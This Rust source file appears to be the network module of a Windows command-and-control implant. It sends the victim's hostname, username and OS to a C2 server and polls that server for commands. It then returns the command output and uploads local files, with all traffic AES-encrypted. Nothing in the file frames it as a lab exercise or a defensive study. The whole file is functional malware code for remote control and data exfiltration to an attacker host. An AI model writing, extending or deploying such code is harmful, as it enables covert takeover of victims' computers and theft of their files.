use crate::crypto::{decrypt_b64, encrypt_b64};
use crate::http::HttpClient;

pub fn register(
    client: &HttpClient,
    c2_url: &str,
    api_key: &str,
    aes_key: &[u8; 32],
) -> Option<(String, String)> {
    let payload = serde_json::json!({
        "hostname": get_hostname(),
        "username": get_username(),
        "os": get_os(),
    });
    let ct = encrypt_b64(payload.to_string().as_bytes(), aes_key);
    let body = serde_json::json!({"ct": ct}).to_string();

    let resp = client.request(
        "POST",
        &format!("{}/api/agent/register", c2_url),
        &[("X-API-Key", api_key), ("Content-Type", "application/json")],
        Some(body.as_bytes()),
    )?;

    if resp.status != 200 {
        return None;
    }

    let resp_json: serde_json::Value =
        serde_json::from_slice(&resp.body).ok()?;
    let ct = resp_json.get("ct")?.as_str()?;
    let plain = decrypt_b64(ct, aes_key)?;
    let parsed: serde_json::Value = serde_json::from_slice(&plain).ok()?;

    Some((
        parsed.get("agent_id")?.as_str()?.to_string(),
        parsed.get("token")?.as_str()?.to_string(),
    ))
}

pub fn poll_tasks(
    client: &HttpClient,
    c2_url: &str,
    agent_id: &str,
    token: &str,
    aes_key: &[u8; 32],
) -> Option<Vec<Task>> {
    let payload = serde_json::json!({"agent_id": agent_id});
    let ct = encrypt_b64(payload.to_string().as_bytes(), aes_key);
    let body = serde_json::json!({"ct": ct}).to_string();

    let resp = client.request(
        "POST",
        &format!("{}/api/agent/poll", c2_url),
        &[
            ("X-Agent-Token", token),
            ("Content-Type", "application/json"),
        ],
        Some(body.as_bytes()),
    )?;

    if resp.status != 200 {
        return None;
    }

    let resp_json: serde_json::Value =
        serde_json::from_slice(&resp.body).ok()?;
    let ct = resp_json.get("ct")?.as_str()?;
    let plain = decrypt_b64(ct, aes_key)?;
    let parsed: serde_json::Value = serde_json::from_slice(&plain).ok()?;

    let tasks = parsed.get("tasks")?.as_array()?;
    Some(
        tasks
            .iter()
            .filter_map(|t| {
                Some(Task {
                    id: t.get("id")?.as_str()?.to_string(),
                    task_type: t.get("type")?.as_str()?.to_string(),
                    command: t.get("command")?.as_str()?.to_string(),
                })
            })
            .collect(),
    )
}

pub fn report_result(
    client: &HttpClient,
    c2_url: &str,
    token: &str,
    task_id: &str,
    stdout: &str,
    stderr: &str,
    exit_code: u32,
    aes_key: &[u8; 32],
) -> bool {
    let payload = serde_json::json!({
        "task_id": task_id,
        "stdout": stdout,
        "stderr": stderr,
        "exit_code": exit_code,
    });
    let ct = encrypt_b64(payload.to_string().as_bytes(), aes_key);
    let body = serde_json::json!({"ct": ct}).to_string();

    let resp = client.request(
        "POST",
        &format!("{}/api/agent/result", c2_url),
        &[
            ("X-Agent-Token", token),
            ("Content-Type", "application/json"),
        ],
        Some(body.as_bytes()),
    );

    resp.is_some() && resp.unwrap().status == 200
}

pub fn upload_file(
    client: &HttpClient,
    c2_url: &str,
    token: &str,
    local_path: &str,
    remote_path: &str,
    aes_key: &[u8; 32],
) -> bool {
    use base64::Engine;
    use base64::engine::GeneralPurpose;
    use base64::alphabet;
    let engine = GeneralPurpose::new(&alphabet::STANDARD, base64::engine::general_purpose::NO_PAD);

    let data = std::fs::read(local_path).ok();
    if data.is_none() {
        return false;
    }
    let payload = serde_json::json!({
        "path": remote_path,
        "data": engine.encode(&data.unwrap()),
    });
    let ct = encrypt_b64(payload.to_string().as_bytes(), aes_key);
    let body = serde_json::json!({"ct": ct}).to_string();

    let resp = client.request(
        "POST",
        &format!("{}/api/agent/upload", c2_url),
        &[
            ("X-Agent-Token", token),
            ("Content-Type", "application/json"),
        ],
        Some(body.as_bytes()),
    );

    resp.is_some() && resp.unwrap().status == 200
}

#[derive(Debug)]
pub struct Task {
    pub id: String,
    pub task_type: String,
    pub command: String,
}

fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
}

fn get_username() -> String {
    std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
}

fn get_os() -> String {
    "Windows".into()
}
